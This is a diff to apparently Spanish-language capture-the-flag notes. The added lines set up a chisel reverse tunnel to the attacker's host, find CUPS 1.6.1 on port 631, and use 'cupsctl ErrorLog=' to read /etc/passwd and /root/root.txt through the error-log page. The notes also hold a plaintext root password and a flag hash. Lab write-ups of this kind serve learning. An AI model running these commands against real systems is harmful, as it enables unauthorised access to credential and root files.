@@ -218,3 +218,17 @@ luego solo use el
 su root
 pass: aaron
 funciono.
+ ./chisel client 10.10.14.2
+./chisel server --reverse -p 1234
+ se encontro un puerto interno corriendo 631 con netstat -tulpn
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1030/python3        
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -        
+searchsploit cups
+curl localhost:631
+	<TITLE>Home - CUPS 1.6.1</TITLE>
+cupsctl ErrorLog=/etc/passwd
+ curl -s -X GET localhost:631/admin/log/error_log
+cupsctl ErrorLog=/root/root.txt
+curl -s -X GET localhost:631/admin/log/error_log 
+470825a2b98965f767ce5541c0e32f1b
